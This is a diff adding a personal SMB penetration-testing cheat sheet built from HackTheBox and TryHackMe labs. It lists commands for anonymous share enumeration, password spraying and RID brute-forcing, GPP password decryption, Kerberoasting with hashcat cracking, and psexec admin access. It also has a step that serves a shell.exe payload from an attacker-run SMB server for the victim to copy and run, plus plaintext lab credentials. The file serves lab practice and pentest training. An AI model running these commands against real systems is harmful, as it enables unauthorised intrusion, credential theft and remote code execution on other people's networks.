@@ -1,0 +1,92 @@
+smbmap -H IP
+smbclient -L \\\\10.129.178.26\\
+crackmapexec smb 172.31.1.1 -u '' -p '' --shares
+crackmapexec smb 10.10.11.174 -u 'guest' -p '' --shares  #working with permission details
+#No password login
+smbclient -N //10.10.1.1/support-tools
+
+https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
+
+smbmap -u "" -p "" -P 445 -H 172.31.1.1 && smbmap -u "guest" -p "" -P 445 -H 172.31.1.1
+smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
+
+smbclient -U johana -L //IP
+
+smbclient.py SAM/vinot@172.31.1.18
+
+crackmapexec smb IP -u users -p 'passwd' --continue-on-success
+
+#SMB Shell \\0432
+smbclient -U SABatchJobs //10.10.10.172/users$/
+smbclient -U '' //support.htb/support-tools/
+
+
+#SMB MOunt
+mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt
+
+#HTB
+locate -r '\.nse$' | xargs grep categories |grep 'default\|version\|safe' |grep smb
+nmap --script safe -p 445 10.10.10.100 -d
+smbclient -L //10.10.10.100
+enum4linux 10.10.10.100
+smbmap -H 10.10.10.100
+smbclient //10.10.10.100/shares
+smbmap -R Shares -H 10.10.10.100
+smbmap -R Shares -H 10.10.10.100 -A Groups.xml -q
+gpp-decrypt hash
+smbclient //10.10.10.100/shares
+recurse ON
+prompt OFF
+mget *
+
+#open the windows machine connect the VPN
+
+runas /netonly /user:active.htb\svc_tgs cmd
+Test-NetConnection -ComputerName 10.10.10.100 -Port 389
+.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+./hashcat -m 13100 hashes/active.htb /usr/share/wordlist/rockyou.txt
+psexec.py active.htb/Administrator@10.10.10.100
+
+#TryHackMe
+
+smbclient -U milesdyson \\\\10.10.174.36\\milesdyson
+
+sudo smbclient -L \\\\10.10.189.24\\ -N
+sudo smbmap -H 10.10.189.24 -u anonymous
+
+smbclient //192.168.117.136/kathy -N
+
+#Listerning port
+netstat -ap tcp
+
+#Creating SMB Server as Kali
+
+smbserver.py -smb2support evil $PWD
+
+
+IN victim machin
+
+md.exe /c copy \\\\192.168.45.233\\Jacko\\shell.exe c:\\users\\tony\\reverse.exe
+
+
+#Checking password policy
+
+crackmapexec smb --pass-pol 10.10.11.108
+
+crackmapexec smb 10.10.11.108 -u "username" --pass-pol
+
+
+crackmapexec smb 10.10.3.31 -u 'twilliams' -p 'roastpotatoes' --rid-brute
+
+
+#Password reset
+
+smbpasswd -r 10.10.216.94 -U sbradley
+
+
+
+
+
+
+
